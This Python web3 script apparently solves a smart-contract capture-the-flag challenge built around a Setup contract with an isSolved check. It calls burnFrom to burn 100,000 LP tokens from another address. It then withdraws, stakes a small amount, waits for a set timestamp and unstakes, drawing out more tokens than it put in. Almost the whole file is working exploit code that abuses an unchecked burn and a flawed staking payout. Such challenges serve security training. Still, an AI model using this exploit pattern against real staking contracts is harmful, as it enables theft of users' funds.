from web3 import Web3
import time

rpc_url = ''  # Replace with your actual RPC URL
private_key = ''  # Replace with actual private key
address= '' # Replace with your address
setup_address = ''  # Replace with actual withdraw address

def send_transaction(private_key, function):
    account = web3.eth.account.from_key(private_key)
    nonce = web3.eth.get_transaction_count(account.address)
    txn = function.build_transaction({
        'chainId': web3.eth.chain_id,
        'gas': 2000000,
        'gasPrice': web3.to_wei('100', 'gwei'),
        'nonce': nonce,
    })
    signed_txn = web3.eth.account.sign_transaction(txn, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return web3.to_hex(tx_hash)

def wait_until_timestamp(target_timestamp):
    while True:
        current_block = web3.eth.block_number
        block = web3.eth.get_block(current_block)
        current_timestamp = block['timestamp']
        if current_timestamp >= target_timestamp:
            break
        else:
            print(f"Waiting for block timestamp to reach {target_timestamp}. Current timestamp: {current_timestamp}")
            time.sleep(10) 


staking_manager_abi = '''
[
    {
        "constant": true,
        "inputs": [],
        "name": "TOKEN",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
		"inputs": [],
		"name": "LPTOKEN",
		"outputs": [
			{
				"internalType": "contract LpToken",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
    {
        "constant": false,
        "inputs": [
            {
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "stake",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [],
        "name": "unstakeAll",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
]
'''

erc20_abi = '''
[
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "success",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
		"inputs": [
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "burnFrom",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
'''

setup_abi= '''
[
	{
		"inputs": [],
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "stakingManager",
		"outputs": [
			{
				"internalType": "contract StakingManager",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "token",
		"outputs": [
			{
				"internalType": "contract Token",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
'''

web3 = Web3(Web3.HTTPProvider(rpc_url))

if not web3.is_connected():
    print("Failed to connect to the blockchain.")
    exit()

account = web3.eth.account.from_key(private_key)
nonce = web3.eth.get_transaction_count(account.address)
print(nonce)

setup_contract=web3.eth.contract(address=Web3.to_checksum_address(setup_address), abi=setup_abi)

staking_manager_address=setup_contract.functions.stakingManager().call()
staking_manager_contract = web3.eth.contract(address=Web3.to_checksum_address(staking_manager_address), abi=staking_manager_abi)

token_address = staking_manager_contract.functions.TOKEN().call()

erc20_token_address = staking_manager_contract.functions.LPTOKEN().call()
erc20_contract = web3.eth.contract(address=Web3.to_checksum_address(erc20_token_address), abi=erc20_abi)

burn_function=erc20_contract.functions.burnFrom(setup_address,web3.to_wei(100000, 'ether'))
burn_hash=send_transaction(private_key,burn_function)
print(burn_hash)
time.sleep(5)

total_supply = erc20_contract.functions.totalSupply().call()
print("Total Supply:", total_supply)
# balance_function2=erc20_contract.functions.balanceOf(address)
# print(balance_function2.call())

print(f"Token address: {token_address}")
token_contract = web3.eth.contract(address=Web3.to_checksum_address(token_address), abi=erc20_abi)


balance_function=token_contract.functions.balanceOf(address)
print(balance_function.call())

withdraw_function = setup_contract.functions.withdraw()
withdraw_tx_hash = send_transaction(private_key, withdraw_function)
print(f"Withdraw transaction hash: {withdraw_tx_hash}")
time.sleep(5)

amount_to_approve = web3.to_wei(1, 'ether')
approve_function = token_contract.functions.approve(staking_manager_address, amount_to_approve)
approve_tx_hash = send_transaction(private_key, approve_function)
print(f"Approve transaction hash: {approve_tx_hash}")
time.sleep(5)

stake_function = staking_manager_contract.functions.stake(amount_to_approve)
stake_tx_hash = send_transaction(private_key, stake_function)
print(f"Stake transaction hash: {stake_tx_hash}")
time.sleep(5)

# balance=token_contract.functions.balanceOf(address)
print(balance_function.call())

target_timestamp = 1717247770  
wait_until_timestamp(target_timestamp)

unstake_function = staking_manager_contract.functions.unstakeAll()
unstake_tx_hash = send_transaction(private_key, unstake_function)
print(f"Unstake transaction hash: {unstake_tx_hash}")

print(balance_function.call())

balance_function=token_contract.functions.balanceOf(setup_address)
print(balance_function.call())

amount_to_send = web3.to_wei(100, 'ether')
transfer_function = token_contract.functions.transfer(setup_address, amount_to_send)
tx_hash = send_transaction(private_key, transfer_function)
print(f"Approve transaction hash: {tx_hash}")
